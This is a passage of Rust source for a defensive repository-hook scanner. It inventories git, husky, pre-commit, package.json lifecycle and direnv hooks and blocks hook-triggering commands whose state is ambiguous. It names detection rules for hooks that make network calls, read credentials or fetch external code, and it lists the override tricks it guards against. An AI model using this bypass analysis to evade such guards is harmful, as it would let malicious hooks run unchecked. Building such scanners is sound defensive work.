//! Repo-hook + automation inventory and risk classification (M9 ch6).
//!
//! Inventories the executable surfaces a repo can run on your behalf — git hooks,
//! husky/lefthook/pre-commit, package-manager lifecycle scripts, direnv `.envrc`,
//! mise/asdf hooks — plus hand-run "automation" (`Makefile`, `justfile`, `Taskfile`).
//! Powers `tirith hooks scan|guard|explain`. Static read only — never executes a hook.
//!
//! Three entry points:
//! 1. **Full inventory** ([`scan_for_repo`] / [`scan_for_cwd`]) — every surface; what
//!    `tirith hooks scan` calls.
//! 2. **Hot-path command-aware** ([`scan_triggered_by_command`]) — scans only the
//!    hooks a command triggers and securely inspects incoming Git trees.
//! 3. **Compatibility leader-targeted** ([`scan_triggered_by_leader`]) — retains
//!    current-tree scans, but fails closed for updates because it has no target argv.
//!
//! Both hot paths are gated behind `policy.hooks_guard_enabled`.
//!
//! The five rules (`RepoHookNetworkCall`, `RepoHookCredentialRead`, `RepoHookSudo`,
//! `RepoHookSuspiciousShellPattern`, `RepoHookExternalFetch`) carry NO PATTERN_TABLE
//! entry — the trigger is repo STATE plus a hot-path git/pkg command, not an input regex.
//! All five live in `EXTERNALLY_TRIGGERED_RULES`.
//!
//! Lifecycle scans intentionally do not cache executable surfaces: each triggering
//! command rebinds hook/config identity so a same-mtime symlink retarget cannot reuse
//! a prior clean verdict. The command-aware hot path also never approves an updating
//! Git command from a pre-update snapshot alone:
//! checkout/switch and fast-forward merge inspect hook blobs in the destination tree
//! with a trusted, hook-disabled Git process, while ambiguous transitions fail closed.

use std::collections::{BTreeMap, BTreeSet};
use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::sync::OnceLock;
use std::time::Duration;

use serde::{Deserialize, Serialize};

use crate::verdict::{RuleId, Severity};

/// Whether a surface is a *hook* (auto-run on a lifecycle event — the attack surface)
/// or *automation* (a task runner run by hand — inventoried for completeness only).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HookCategory {
    /// Auto-executed on a tool lifecycle event.
    Hook,
    /// A task runner the developer invokes explicitly; not auto-scanned per command.
    Automation,
}

impl HookCategory {
    pub fn as_str(self) -> &'static str {
        match self {
            HookCategory::Hook => "hook",
            HookCategory::Automation => "automation",
        }
    }
}

/// Which tool owns a surface. Drives `explain` output and per-leader targeting.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HookProvider {
    /// `.git/hooks/<name>`.
    Git,
    /// `.husky/<name>`.
    Husky,
    /// `lefthook.yml` (a config that names commands per git event).
    Lefthook,
    /// `.pre-commit-config.yaml`.
    PreCommit,
    /// `package.json` lifecycle script (`preinstall`/`install`/`postinstall`/`prepare`).
    PackageJson,
    /// `.envrc` (direnv).
    Direnv,
    /// `mise.toml` / `.mise.toml` / `.tool-versions` (asdf/mise tool hooks).
    Mise,
    /// `Makefile`.
    Makefile,
    /// `justfile` / `Justfile`.
    Justfile,
    /// `Taskfile.yml` / `Taskfile.yaml`.
    Taskfile,
}

impl HookProvider {
    pub fn as_str(self) -> &'static str {
        match self {
            HookProvider::Git => "git",
            HookProvider::Husky => "husky",
            HookProvider::Lefthook => "lefthook",
            HookProvider::PreCommit => "pre-commit",
            HookProvider::PackageJson => "package.json",
            HookProvider::Direnv => "direnv",
            HookProvider::Mise => "mise/asdf",
            HookProvider::Makefile => "makefile",
            HookProvider::Justfile => "justfile",
            HookProvider::Taskfile => "taskfile",
        }
    }

    fn category(self) -> HookCategory {
        match self {
            // Task runners + mise/asdf are "automation" — inventory-only, not auto-scanned.
            HookProvider::Makefile
            | HookProvider::Justfile
            | HookProvider::Taskfile
            | HookProvider::Mise => HookCategory::Automation,
            _ => HookCategory::Hook,
        }
    }
}

/// One enumerated hook / automation surface, with its body and any findings.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RepoHookEntry {
    /// Display name (`pre-commit`, `postinstall`, `Makefile`, `.envrc`, …).
    pub name: String,
    /// hook vs automation.
    pub category: HookCategory,
    /// Owning tool.
    pub provider: HookProvider,
    /// The file the body was read from.
    pub source_path: PathBuf,
    /// Classified body text (empty on non-UTF-8). NEVER printed verbatim — the CLI
    /// credential-redacts it at the presentation layer.
    pub body: String,
    /// Git lifecycle event(s) this surface triggers (for per-leader targeting); empty
    /// for automation and package lifecycle scripts.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub git_events: Vec<String>,
    /// Findings against this entry's body.
    pub findings: Vec<RepoHookFinding>,
}

impl RepoHookEntry {
    /// `true` when any finding against this entry is High or Critical.
    pub fn has_high(&self) -> bool {
        self.findings.iter().any(RepoHookFinding::is_high)
    }

    /// Highest severity across this entry's findings, if any.
    pub fn max_severity(&self) -> Option<Severity> {
        self.findings.iter().map(|f| f.severity).max()
    }
}

/// A single risk finding emitted for a [`RepoHookEntry`].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RepoHookFinding {
    /// The rule that fired.
    pub rule_id: RuleId,
    /// Severity.
    pub severity: Severity,
    /// Hook / surface name the finding is about.
    pub name: String,
    /// Owning tool.
    pub provider: HookProvider,
    /// Human-readable location (full file path).
    pub location: String,
    /// Why the rule fired. Echoes the matched token only, never the body (may hold a secret).
    pub detail: String,
}

impl RepoHookFinding {
    pub fn is_high(&self) -> bool {
        matches!(self.severity, Severity::High | Severity::Critical)
    }
}

/// Full result of a hook inventory scan.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct RepoHookScan {
    /// The repo root that was scanned (display form). `None` when no `.git`
    /// boundary / scan root was resolvable.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub repo_root: Option<String>,
    /// Every surface discovered (hooks first, then automation).
    pub entries: Vec<RepoHookEntry>,
}

impl RepoHookScan {
    /// All findings flattened across every entry.
    pub fn all_findings(&self) -> Vec<&RepoHookFinding> {
        self.entries
            .iter()
            .flat_map(|e| e.findings.iter())
            .collect()
    }

    /// `true` when any entry carries a High/Critical finding (drives exit 1).
    pub fn has_high(&self) -> bool {
        self.entries.iter().any(RepoHookEntry::has_high)
    }

    /// Count of entries in each category.
    pub fn category_counts(&self) -> (usize, usize) {
        let hooks = self
            .entries
            .iter()
            .filter(|e| e.category == HookCategory::Hook)
            .count();
        let automation = self.entries.len() - hooks;
        (hooks, automation)
    }
}

/// Full inventory scan of the repo containing the cwd. Resolves the repo root via
/// [`crate::policy::find_repo_root`], falling back to the cwd when there's no `.git`
/// boundary so a non-git project still gets coverage. Empty scan when no root resolves.
pub fn scan_for_cwd() -> RepoHookScan {
    let root = crate::policy::find_repo_root(None).or_else(|| std::env::current_dir().ok());
    match root {
        Some(r) => scan_for_repo(&r),
        None => RepoHookScan::default(),
    }
}

/// Testable full-inventory entry point: enumerate + classify every surface under
/// `repo_root`. Static read only.
pub fn scan_for_repo(repo_root: &Path) -> RepoHookScan {
    let entries = collect_all(repo_root);
    RepoHookScan {
        repo_root: Some(repo_root.display().to_string()),
        entries,
    }
}

/// Match an entry for `tirith hooks explain` against either its short display name
/// (`pre-commit`) OR the path `hooks scan` prints (`.git/hooks/pre-commit`), so a user
/// can copy-paste either form. Tries, in order: exact name; the source path's file name;
/// the full displayed path; or the displayed path with a trailing `/<query>` so a
/// path-segment-aligned fragment of the printed path also matches.
fn entry_matches(entry: &RepoHookEntry, query: &str) -> bool {
    if entry.name == query {
        return true;
    }
    let sp = entry.source_path.as_path();
    if sp.file_name().and_then(|n| n.to_str()) == Some(query) {
        return true;
    }
    let disp = sp.to_string_lossy();
    disp == query || disp.ends_with(&format!("/{query}"))
}

/// Look up a surface by name for `tirith hooks explain`. Returns every matching entry
/// (a name like `pre-commit` can exist under `.git/hooks`, `.husky`, AND `lefthook.yml`).
pub fn explain_for_cwd(name: &str) -> Vec<RepoHookEntry> {
    let scan = scan_for_cwd();
    scan.entries
        .into_iter()
        .filter(|e| entry_matches(e, name))
        .collect()
}

/// Testable `explain` entry point.
pub fn explain_for_repo(repo_root: &Path, name: &str) -> Vec<RepoHookEntry> {
    scan_for_repo(repo_root)
        .entries
        .into_iter()
        .filter(|e| entry_matches(e, name))
        .collect()
}

/// Compatibility leader-only scan for commands whose destination is their
/// current worktree. Updating Git operations deliberately fail closed here:
/// without their complete argv, this API cannot resolve and inspect the target.
/// The engine uses [`scan_triggered_by_command`] for those operations.
///
/// Per-leader targeting (load-bearing scope):
/// - `git commit` → pre-commit, prepare-commit-msg, commit-msg, post-commit.
/// - `git push` → pre-push.
/// - `git pull`/`merge`/`rebase`/`checkout`/`switch`/`am`/`clone`/`worktree add`
///   → destination-aware inspection or a blocking incomplete-state finding.
/// - `npm/yarn/pnpm install|ci` → `package.json` lifecycle scripts only.
/// - `direnv allow|reload|export` → `.envrc`; `direnv exec` also fails closed
///   for its environment-mutated nested command.
///
/// `Makefile`/`justfile`/`Taskfile` are NEVER returned (inventory-only).
pub fn scan_triggered_by_leader(
    repo_root: &Path,
    leader: &str,
    subcommand: Option<&str>,
) -> Option<Vec<RepoHookFinding>> {
    let target = LeaderTarget::resolve(leader, subcommand)?;

    // A leader/subcommand pair carries no branch, tree, index-path, or merge
    // target. Never recreate repo-0013 by blessing an update from the old tree.
    if target.invalidate_cache {
        invalidate_cache_for(repo_root);
        return Some(vec![incoming_state_block(
            Some(repo_root),
            "updating Git command was supplied without its target arguments; destination hook state was not inspected",
        )]);
    }

    let scan = scan_for_repo(repo_root);

    let findings = scan
        .entries
        .iter()
        .filter(|e| target.matches(e))
        .flat_map(|e| e.findings.iter().cloned())
        .collect();
    Some(findings)
}

/// Command-aware hot-path scan used by the engine. Unlike
/// [`scan_triggered_by_leader`], this receives the complete first-segment
/// argument vector, so Git operations which replace tracked hook runners or
/// configuration are assessed against the state they are about to install.
///
/// An [`RuleId::AnalysisIncomplete`] High finding means the destination state
/// could not be established without executing attacker-controlled repository
/// behavior. That finding is deliberately fail-closed. `git pull` is never run
/// speculatively here: callers are directed to fetch first and then invoke a
/// separately inspected merge.
pub fn scan_triggered_by_command(
    repo_root: Option<&Path>,
    leader: &str,
    args: &[String],
) -> Option<Vec<RepoHookFinding>> {
    let leader_name = leader_basename(leader).to_ascii_lowercase();
    if leader_name != "git" {
        let (target, has_workdir_override, has_workspace_override) =
            target_for_non_git_invocation(&leader_name, args)?;
        let direnv_operation = (leader_name == "direnv")
            .then(|| direnv_operation_and_operand(args))
            .flatten();
        if let Some((operation, operand)) = &direnv_operation {
            let wrong_target = match operation.as_str() {
                "exec" => operand.as_deref() != Some("."),
                "allow" => !matches!(operand.as_deref(), None | Some("." | ".envrc")),
                _ => false,
            };
            if wrong_target {
                return Some(vec![non_git_state_block(
                    repo_root,
                    &leader_name,
                    "direnv operation targets another path, so the .envrc selected or approved at execution time is not the one inspected by this guard",
                )]);
            }
        }
        if has_workdir_override {
            return Some(vec![non_git_state_block(
                repo_root,
                &leader_name,
                "package-manager working-directory override makes the lifecycle configuration ambiguous; run the command from the target project without --prefix, --cwd, --dir, or -C",
            )]);
        }
        if has_workspace_override {
            return Some(vec![non_git_state_block(
                repo_root,
                &leader_name,
                "package-manager workspace/recursive selection can execute lifecycle scripts outside the single project manifest inspected by this guard",
            )]);
        }
        let Some(repo_root) = repo_root else {
            return Some(vec![non_git_state_block(
                None,
                &leader_name,
                "command working directory could not be resolved, so automatic lifecycle configuration was not inspected",
            )]);
        };
        let mut findings = findings_for_current_tree(repo_root, &target);
        if direnv_operation
            .as_ref()
            .is_some_and(|(operation, _)| operation == "exec")
        {
            findings.push(non_git_state_block(
                Some(repo_root),
                &leader_name,
                "direnv exec applies .envrc mutations before executing a nested command whose repository, package, and environment state cannot be bound by this single-command scan",
            ));
        }
        if target.package_scripts.contains(&"preinstall") && project_declares_workspaces(repo_root)
        {
            findings.push(non_git_state_block(
                Some(repo_root),
                &leader_name,
                "project declares workspaces whose lifecycle manifests are not bounded by this single-project hot scan",
            ));
        }
        return Some(findings);
    }

    let invocation = match parse_git_invocation(args) {
        Ok(Some(invocation)) => invocation,
        Ok(None) => return None,
        Err(()) => {
            return Some(vec![incoming_state_block(
                repo_root,
                "Git arguments could not be parsed safely, so a quoted or escaped update alias cannot bypass destination-hook inspection",
            )]);
        }
    };
    if !safe_git_subcommand(&invocation.subcommand) {
        return Some(vec![incoming_state_block(
            repo_root,
            "dynamic Git subcommand cannot prove that an updating alias is absent; hook state was not inspected",
        )]);
    }
    let target = match target_for_git_invocation(&invocation) {
        Err(reason) => {
            return Some(vec![incoming_state_block(repo_root, reason)]);
        }
        Ok(None)
            if is_known_non_hook_git_subcommand(&invocation.subcommand)
                || explicitly_nontriggering_git_invocation(&invocation) =>
        {
            return None;
        }
        Ok(None) => {
            return Some(vec![incoming_state_block(
                repo_root,
                "unknown Git subcommand may be an update alias; use the explicit Git lifecycle subcommand so destination hooks can be inspected",
            )]);
        }
        Ok(Some(target)) => target,
    };
    let updating = is_git_update_subcommand(&invocation.subcommand);

    if invocation.has_repository_override {
        return Some(vec![incoming_state_block(
            repo_root,
            "Git repository/configuration override makes the hook state ambiguous; run the lifecycle command from the repository without -C, --git-dir, --work-tree, -c, or --config-env",
        )]);
    }

    let Some(repo_root) = repo_root else {
        return Some(if updating {
            vec![incoming_state_block(
                None,
                "Git update repository could not be resolved, so destination hook state was not inspected",
            )]
        } else {
            Vec::new()
        });
    };

    if !updating {
        return Some(findings_for_current_tree(repo_root, &target));
    }

    invalidate_cache_for(repo_root);
    let mut findings = findings_for_current_tree(repo_root, &target);
    match destination_for_git_update(repo_root, &invocation) {
        Ok(GitDestination::Current) => {}
        Ok(GitDestination::Tree(tree)) => {
            match scan_git_tree_surfaces(repo_root, &tree, target.git_events) {
                Ok(mut incoming) => findings.append(&mut incoming),
                Err(reason) => findings.push(incoming_state_block(Some(repo_root), reason)),
            }
        }
        Ok(GitDestination::Index) => match scan_git_index_surfaces(repo_root, target.git_events) {
            Ok(mut incoming) => findings.append(&mut incoming),
            Err(reason) => findings.push(incoming_state_block(Some(repo_root), reason)),
        },
        Err(reason) => findings.push(incoming_state_block(Some(repo_root), reason)),
    }
    Some(findings)
}

/// Complete first-segment predicate paired with [`scan_triggered_by_command`].
/// Global Git options with values are skipped before choosing the subcommand;
/// malformed argument vectors which still visibly name an updating operation
/// are treated as triggering so they reach the fail-closed path.
pub fn is_hook_triggering_command(leader: &str, args: &[String]) -> bool {
    let leader_name = leader_basename(leader).to_ascii_lowercase();
    if leader_name == "git" {
        return match parse_git_invocation(args) {
            Ok(Some(invocation)) if !safe_git_subcommand(&invocation.subcommand) => true,
            Ok(Some(invocation)) => match target_for_git_invocation(&invocation) {
                Ok(Some(_)) | Err(_) => true,
                Ok(None) if explicitly_nontriggering_git_invocation(&invocation) => false,
                Ok(None) => !is_known_non_hook_git_subcommand(&invocation.subcommand),
            },
            Ok(None) => false,
            // Shell quote concatenation can turn a syntactically odd token such
            // as `check\"out\"` into the real `checkout` command after this
            // analysis. Force malformed Git input into the fail-closed scan.
            Err(()) => true,
        };
    }
    target_for_non_git_invocation(&leader_name, args).is_some()
}

fn findings_for_current_tree(repo_root: &Path, target: &LeaderTarget) -> Vec<RepoHookFinding> {
    scan_for_repo(repo_root)
        .entries
        .iter()
        .filter(|entry| target.matches(entry))
        .flat_map(|entry| entry.findings.iter().cloned())
        .collect()
}

fn incoming_state_block(repo_root: Option<&Path>, detail: impl Into<String>) -> RepoHookFinding {
    RepoHookFinding {
        rule_id: RuleId::AnalysisIncomplete,
        severity: Severity::High,
        name: "incoming-hook-state".to_string(),
        provider: HookProvider::Git,
        location: repo_root
            .map(|root| root.display().to_string())
            .unwrap_or_else(|| "<unresolved repository>".to_string()),
        detail: detail.into(),
    }
}

fn non_git_state_block(
    root: Option<&Path>,
    leader: &str,
    detail: impl Into<String>,
) -> RepoHookFinding {
    let (name, provider) = if leader == "direnv" {
        (".envrc", HookProvider::Direnv)
    } else {
        ("package.json", HookProvider::PackageJson)
    };
    RepoHookFinding {
        rule_id: RuleId::AnalysisIncomplete,
        severity: Severity::High,
        name: name.to_string(),
        provider,
        location: root
            .map(|root| root.join(name).display().to_string())
            .unwrap_or_else(|| "<unresolved working directory>".to_string()),
        detail: detail.into(),
    }
}

/// Fail-closed marker for a hook-triggering command which appears after another
/// shell segment. The earlier segment has not run at analysis time and can
/// change cwd, refs, the index, or hook files, so the later command has no
/// destination snapshot that can be honestly approved.
pub fn sequenced_hook_command_block(repo_root: Option<&Path>) -> RepoHookFinding {
    incoming_state_block(
        repo_root,
        "hook-triggering command follows another shell segment whose state changes are not yet known; run and inspect the lifecycle command separately",
    )
}

/// Fail closed when the shell/wrapper environment redirects Git repository,
/// index, object, or configuration identity away from the context we scanned.
pub fn git_environment_override_block(repo_root: Option<&Path>) -> RepoHookFinding {
    incoming_state_block(
        repo_root,
        "GIT_DIR/GIT_WORK_TREE/GIT_COMMON_DIR/GIT_INDEX_FILE/GIT_OBJECT_DIRECTORY or GIT_CONFIG_* environment overrides make the executed hook state ambiguous",
    )
}

/// Fail closed when a wrapper changes cwd, root, user, or another execution
/// identity after the engine resolved the lifecycle command. The repository or
/// package state selected by that wrapper is not the state the hot guard bound.
pub fn execution_context_override_block(root: Option<&Path>, leader: &str) -> RepoHookFinding {
    let leader = leader_basename(leader).to_ascii_lowercase();
    if leader == "git" {
        incoming_state_block(
            root,
            "command wrapper changes the Git execution directory, root, or identity; destination hook state was not inspected in that alternate context",
        )
    } else {
        non_git_state_block(
            root,
            &leader,
            "command wrapper changes the lifecycle execution directory, root, or identity; automatic lifecycle configuration was not inspected in that alternate context",
        )
    }
}

/// Fail closed when package-manager configuration in the effective environment
/// can select another project, workspace, or global installation context.
pub fn package_environment_override_block(root: Option<&Path>, leader: &str) -> RepoHookFinding {
    non_git_state_block(
        root,
        &leader_basename(leader).to_ascii_lowercase(),
        "package-manager environment configuration can redirect project, workspace, or global lifecycle scope away from the manifest inspected by this guard",
    )
}

/// The trusted inspector and runtime Git must be the same installation because
/// installation-specific system configuration can select a different
/// `core.hooksPath` even when repository and HOME/global configuration match.
pub fn runtime_git_matches_trusted_inspector(runtime_path: &Path) -> bool {
    let Ok(inspector) = trusted_git_executable() else {
        return false;
    };
    let Ok(runtime_path) = std::fs::canonicalize(runtime_path) else {
        return false;
    };
    runtime_path.as_path() == inspector.path()
}

pub fn git_executable_identity_block(repo_root: Option<&Path>) -> RepoHookFinding {
    incoming_state_block(
        repo_root,
        "runtime Git executable or PATH identity differs from the trusted Git used to resolve system configuration and core.hooksPath",
    )
}

fn is_git_update_subcommand(subcommand: &str) -> bool {
    matches!(
        subcommand,
        "pull" | "merge" | "rebase" | "checkout" | "switch" | "am" | "clone" | "worktree"
    )
}

fn target_for_git_invocation(
    invocation: &GitInvocation,
) -> Result<Option<LeaderTarget>, &'static str> {
    match invocation.subcommand.as_str() {
        // receive-pack runs hooks in the repository named by its operand, not
        // necessarily the caller's discovered repository. The engine has no
        // separately bound root for that server-side target, so refuse it.
        "receive-pack" => Err(
            "git receive-pack targets another repository context whose server-side hook state was not inspected",
        ),
        "remote" => match invocation
            .args
            .iter()
            .find(|arg| !arg.starts_with('-'))
            .map(String::as_str)
        {
            Some("add" | "remove" | "rm" | "rename" | "prune" | "update" | "set-head") => {
                Ok(LeaderTarget::resolve("git", Some("remote-update")))
            }
            _ => Ok(None),
        },
        "worktree" => match invocation.args.first().map(String::as_str) {
            Some("add") => {
                if !git_checkout_enabled(&invocation.args, 1, false) {
                    Ok(None)
                } else {
                    Ok(LeaderTarget::resolve("git", Some("worktree")))
                }
            }
            Some("list" | "lock" | "move" | "prune" | "remove" | "repair" | "unlock") | None => {
                Ok(None)
            }
            Some(_) => {
                Err("unknown git worktree operation cannot prove that post-checkout is absent")
            }
        },
        "clone" if !git_checkout_enabled(&invocation.args, 0, true) => {
            Ok(None)
        }
        _ => Ok(LeaderTarget::resolve("git", Some(&invocation.subcommand))),
    }
}

fn explicitly_nontriggering_git_invocation(invocation: &GitInvocation) -> bool {
    match invocation.subcommand.as_str() {
        "worktree" => {
            matches!(
                invocation.args.first().map(String::as_str),
                None | Some("list" | "lock" | "move" | "prune" | "remove" | "repair" | "unlock")
            ) || (invocation.args.first().map(String::as_str) == Some("add")
                && !git_checkout_enabled(&invocation.args, 1, false))
        }
        "clone" => !git_checkout_enabled(&invocation.args, 0, true),
        _ => false,
    }
}

/// Resolve Git's ordered checkout toggle before the option terminator. Both
/// clone and worktree use last-option-wins semantics; tokens after `--` are
/// positional paths and must never disable the lifecycle route.
fn git_checkout_enabled(args: &[String], skip: usize, clone_short_flag: bool) -> bool {
    let mut enabled = true;
    for arg in args
        .iter()
        .skip(skip)
        .take_while(|arg| arg.as_str() != "--")
    {
        match arg.as_str() {
            "--checkout" => enabled = true,
            "--no-checkout" => enabled = false,
            "-n" if clone_short_flag => enabled = false,
            _ => {}
        }
    }
    enabled
}

fn safe_git_subcommand(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 128
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
}

fn is_known_non_hook_git_subcommand(value: &str) -> bool {
    matches!(
        value,
        // Read-only porcelain and plumbing.
        "annotate"
            | "blame"
            | "cat-file"
            | "check-attr"
            | "check-ignore"
            | "check-mailmap"
            | "check-ref-format"
            | "count-objects"
            | "describe"
            | "diff"
            | "diff-files"
            | "diff-index"
            | "diff-tree"
            | "for-each-ref"
            | "fsck"
            | "grep"
            | "help"
            | "log"
            | "ls-files"
            | "ls-remote"
            | "ls-tree"
            | "merge-base"
            | "name-rev"
            | "rev-list"
            | "rev-parse"
            | "shortlog"
            | "show"
            | "show-branch"
            | "show-ref"
            | "status"
            | "verify-commit"
            | "verify-pack"
            | "verify-tag"
            // State changes which do not execute repository lifecycle hooks.
            // `fetch` is explicitly required by the safe pull split.
            | "add"
            | "branch"
            | "clean"
            | "config"
            | "fetch"
            | "gc"
            | "maintenance"
            | "mv"
            | "pack-refs"
            | "prune"
            | "reflog"
            | "remote"
            | "reset"
            | "restore"
            | "rm"
            | "tag"
            | "update-index"
            | "update-ref"
    )
}

#[derive(Debug)]
struct GitInvocation {
    subcommand: String,
    args: Vec<String>,
    has_repository_override: bool,
}

fn parse_git_invocation(raw_args: &[String]) -> Result<Option<GitInvocation>, ()> {
    let args = raw_args
        .iter()
        .map(|arg| normalize_command_arg(arg))
        .collect::<Result<Vec<_>, _>>()?;
    let mut index = 0;
    let mut has_repository_override = false;
    while index < args.len() {
        let arg = &args[index];
        if arg == "--" {
            return Ok(None);
        }
        if !arg.starts_with('-') || arg == "-" {
            return Ok(Some(GitInvocation {
                subcommand: arg.to_ascii_lowercase(),
                args: args[index + 1..].to_vec(),
                has_repository_override,
            }));
        }

        match arg.as_str() {
            "--help" | "--version" => return Ok(None),
            "--no-pager"
            | "--paginate"
            | "--no-replace-objects"
            | "--literal-pathspecs"
            | "--glob-pathspecs"
            | "--noglob-pathspecs"
            | "--icase-pathspecs"
            | "--no-optional-locks" => index += 1,
            "-C" | "-c" | "--git-dir" | "--work-tree" | "--namespace" | "--config-env" => {
                has_repository_override = true;
                if index + 1 >= args.len() {
                    return Err(());
                }
                index += 2;
            }
            _ if arg.starts_with("-C") && arg.len() > 2 => {
                has_repository_override = true;
                index += 1;
            }
            _ if arg.starts_with("-c") && arg.len() > 2 => {
                has_repository_override = true;
                index += 1;
            }
            _ if arg.starts_with("--git-dir=")
                || arg.starts_with("--work-tree=")
                || arg.starts_with("--namespace=")
                || arg.starts_with("--config-env=") =>
            {
                has_repository_override = true;
                index += 1;
            }
            // An unknown global option may change repository discovery or consume
            // a following value. Continue far enough to recognize a visible update
            // subcommand, but make that update fail closed below.
            _ => {
                has_repository_override = true;
                index += 1;
            }
        }
    }
    Ok(None)
}

fn normalize_command_arg(raw: &str) -> Result<String, ()> {
    let trimmed = raw.trim();
    if trimmed.is_empty() || trimmed.chars().any(char::is_control) {
        return Err(());
    }
    let bytes = trimmed.as_bytes();
    if matches!(bytes.first(), Some(b'\'' | b'"')) {
        if bytes.len() < 2 || bytes.last() != bytes.first() {
            return Err(());
        }
        let inner = &trimmed[1..trimmed.len() - 1];
        if inner.contains('\'') || inner.contains('"') {
            return Err(());
        }
        return Ok(inner.to_string());
    }
    if trimmed.contains('\'') || trimmed.contains('"') {
        return Err(());
    }
    Ok(trimmed.to_string())
}

fn trim_outer_quotes(raw: &str) -> String {
    normalize_command_arg(raw).unwrap_or_else(|_| raw.trim().to_string())
}

/// Resolve package-manager/direnv lifecycle commands without mistaking the
/// value of a working-directory option for the subcommand. Returning the
/// override bit lets the command-aware scan fail closed instead of inspecting
/// `ctx.cwd` while the tool executes another project's lifecycle scripts.
fn target_for_non_git_invocation(
    leader: &str,
    raw_args: &[String],
) -> Option<(LeaderTarget, bool, bool)> {
    let args: Vec<String> = raw_args.iter().map(|arg| trim_outer_quotes(arg)).collect();
    let has_workdir_override = args
        .iter()
        .any(|arg| non_git_workdir_option(leader, arg).is_some());
    let has_workspace_override = args
        .iter()
        .any(|arg| non_git_workspace_option(leader, arg).is_some());

    let mut index = 0;
    while index < args.len() {
        let arg = &args[index];
        if let Some(consumes_next) = non_git_workspace_option(leader, arg) {
            index += if consumes_next { 2 } else { 1 };
            continue;
        }
        match non_git_workdir_option(leader, arg) {
            Some(true) => {
                // A missing value makes the command itself invalid; if a
                // lifecycle token follows it, consuming that token as the
                // option value avoids blessing a different project by mistake.
                index = index.saturating_add(2);
            }
            Some(false) => index += 1,
            None if arg == "--" => index += 1,
            None if arg.starts_with('-') => index += 1,
            None => {
                if leader == "yarn" && matches!(arg.as_str(), "workspace" | "workspaces") {
                    if arg == "workspaces"
                        && args[index + 1..]
                            .iter()
                            .find(|candidate| !candidate.starts_with('-'))
                            .is_some_and(|candidate| candidate == "focus")
                    {
                        return LeaderTarget::resolve(leader, Some("install"))
                            .map(|target| (target, has_workdir_override, true));
                    }
                    return args[index + 1..]
                        .iter()
                        .find_map(|candidate| LeaderTarget::resolve(leader, Some(candidate)))
                        .map(|target| (target, has_workdir_override, true));
                }
                if leader == "yarn" && arg == "global" {
                    let operation = args[index + 1..]
                        .iter()
                        .find(|candidate| !candidate.starts_with('-'))
                        .map(String::as_str);
                    return match operation {
                        Some("add") => LeaderTarget::resolve(leader, Some("add"))
                            .map(|target| (target, has_workdir_override, true)),
                        _ => None,
                    };
                }
                if leader == "yarn" && arg == "npm" {
                    let yarn_npm_subcommand = args[index + 1..]
                        .iter()
                        .find(|candidate| !candidate.starts_with('-'))
                        .map(String::as_str);
                    return match yarn_npm_subcommand {
                        Some("publish") => LeaderTarget::resolve(leader, Some("npm-publish"))
                            .map(|target| (target, has_workdir_override, has_workspace_override)),
                        _ => None,
                    };
                }
                return LeaderTarget::resolve(leader, Some(arg))
                    .map(|target| (target, has_workdir_override, has_workspace_override));
            }
        }
    }

    LeaderTarget::resolve(leader, None)
        .map(|target| (target, has_workdir_override, has_workspace_override))
}

/// Return direnv's operation and its first operand. Callers bind `allow` and
/// `exec` to the current `.envrc`; missing operands remain visible as `None`.
fn direnv_operation_and_operand(raw_args: &[String]) -> Option<(String, Option<String>)> {
    let args: Vec<String> = raw_args.iter().map(|arg| trim_outer_quotes(arg)).collect();
    let operation = args.iter().position(|arg| !arg.starts_with('-'))?;
    Some((args[operation].clone(), args.get(operation + 1).cloned()))
}

/// `Some(true)` means the option consumes the next token; `Some(false)` is an
/// attached/`=` form. Only options that change the project whose hooks execute
/// belong here. Other ordinary flags are skipped by the caller.
fn non_git_workdir_option(leader: &str, arg: &str) -> Option<bool> {
    let long = match leader {
        "npm" => "--prefix",
        "yarn" | "bun" => "--cwd",
        "pnpm" => "--dir",
        _ => return None,
    };
    if arg == long {
        return Some(true);
    }
    if arg
        .strip_prefix(long)
        .is_some_and(|rest| rest.starts_with('='))
    {
        return Some(false);
    }
    if leader == "pnpm" && arg == "-C" {
        return Some(true);
    }
    if leader == "pnpm" && arg.starts_with("-C") && arg.len() > 2 {
        return Some(false);
    }
    None
}

fn non_git_workspace_option(leader: &str, arg: &str) -> Option<bool> {
    let (value_options, boolean_options): (&[&str], &[&str]) = match leader {
        "npm" => (&["--workspace", "-w"], &["--workspaces", "--global", "-g"]),
        "pnpm" => (
            &["--filter", "-F"],
            &[
                "--recursive",
                "-r",
                "--workspace-root",
                "-w",
                "--global",
                "-g",
            ],
        ),
        "yarn" => (&[], &["--global", "-g"]),
        "bun" => (&["--filter"], &["--global", "-g"]),
        _ => return None,
    };
    if value_options.contains(&arg) {
        return Some(true);
    }
    if boolean_options.contains(&arg) {
        return Some(false);
    }
    if value_options.iter().any(|option| {
        arg.strip_prefix(option).is_some_and(|rest| {
            rest.starts_with('=') || (!option.starts_with("--") && !rest.is_empty())
        })
    }) {
        return Some(false);
    }
    None
}

fn project_declares_workspaces(project_root: &Path) -> bool {
    let mut current = project_root;
    for _ in 0..64 {
        for workspace_file in ["pnpm-workspace.yaml", "pnpm-workspace.yml"] {
            match std::fs::symlink_metadata(current.join(workspace_file)) {
                Ok(_) => return true,
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
                // An ancestor marker which exists but cannot be inspected still
                // means the lifecycle scope has not been bounded.
                Err(_) => return true,
            }
        }

        match read_text(&current.join("package.json"), current) {
            ReadOutcome::Text(contents) => {
                let Ok(package) = serde_json::from_str::<serde_json::Value>(&contents) else {
                    // The selected manifest is classified separately. An
                    // unparseable ancestor cannot prove that no workspace exists.
                    return true;
                };
                let declares = match package.get("workspaces") {
                    Some(serde_json::Value::Array(values)) => !values.is_empty(),
                    Some(serde_json::Value::Object(mapping)) => mapping
                        .get("packages")
                        .and_then(serde_json::Value::as_array)
                        .is_none_or(|values| !values.is_empty()),
                    Some(serde_json::Value::Null) | None => false,
